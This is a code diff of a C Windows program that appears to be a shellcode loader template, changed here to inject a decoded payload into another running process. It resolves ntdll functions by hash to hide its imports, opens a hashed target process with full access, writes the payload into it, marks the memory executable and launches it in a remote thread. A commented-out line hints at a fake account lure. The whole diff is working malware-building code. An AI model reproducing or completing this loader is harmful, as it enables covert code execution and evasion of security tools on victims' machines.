@@ -79,29 +79,46 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
         
         // fprintf(file, "You have a nice account ! Let's get the transaction done !\n");
         // fclose(file);
-
+        
         NtAllocVirtMem _NtAlocVirtMem = (NtAllocVirtMem)CustomGetProcAdress(hNtdll, VIRTUAL_ALLOC_HASH);
         NtWriteVirtMem _NtWriteVirtMem = (NtWriteVirtMem)CustomGetProcAdress(hNtdll, WRITE_MEMORY_HASH);
         NtProtectVirtMem _NtProtectVirtMem = (NtProtectVirtMem)CustomGetProcAdress(hNtdll, VIRTUAL_PROTECT_HASH);
         NtCreateThreadEx _NtCreateThreadEx = (NtCreateThreadEx)CustomGetProcAdress(hNtdll, CREATE_THREAD_HASH);
         NtWaitForSingleObj _NtWaitForSingleObj = (NtWaitForSingleObj)CustomGetProcAdress(hNtdll, WAIT_FOR_SINGLE_OBJECT_HASH);
+        OpenProc _OpenProcess = (OpenProc)CustomGetProcAdress(hKernel32dll, OPEN_PROCESS_HASH);
         
+        
+        DWORD pid = _GetProcessID(hKernel32dll, TARGET_PROCESS_NAME_HASH);
+
+        HANDLE hProcess = _OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+        if (hProcess == NULL) {
+            MessageBox(NULL, "Echec d'ouverture du processus cible.\n", "Erreur", MB_OK | MB_ICONERROR);
+            DWORD error = GetLastError();
+            char errorMessage[256];
+            FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, error, 0, errorMessage, sizeof(errorMessage), NULL);
+            MessageBox(NULL, errorMessage, "Last Error", MB_OK | MB_ICONERROR);
+            return -1;
+        }
+
         // Allocating executable memory
-        _NtAlocVirtMem((HANDLE)-1, &exec, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        _NtAlocVirtMem(hProcess, &exec, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         
         %SHELLCODE_DECODER%
         
         // Copy shellcode into allocated memory
-        _NtWriteVirtMem((HANDLE)-1, exec, payload, sizeof(payload), NULL);
+        _NtWriteVirtMem(hProcess, exec, payload, sizeof(payload), NULL);
         
         // Changing memory protection to PAGE_EXECUTE_READ
-        _NtProtectVirtMem((HANDLE)-1, &exec, &regionSize, PAGE_EXECUTE_READ, &old_protect);
+        _NtProtectVirtMem(hProcess, &exec, &regionSize, PAGE_EXECUTE_READ, &old_protect);
         
         // Executing shellcode in a new thread
-        _NtCreateThreadEx(&th, GENERIC_ALL, NULL, (HANDLE)-1, exec, NULL, false, (ULONG_PTR)NULL, (SIZE_T)NULL, (SIZE_T)NULL, NULL);
+        _NtCreateThreadEx(&th, GENERIC_ALL, NULL, hProcess, exec, NULL, false, (ULONG_PTR)NULL, (SIZE_T)NULL, (SIZE_T)NULL, NULL);
         
         // Waiting for thread to finish
-        _NtWaitForSingleObj(th, false, NULL);
+        // _NtWaitForSingleObj(th, false, NULL);
+
+        CloseHandle(th);
+        CloseHandle(hProcess);
     }
 
     return 0;
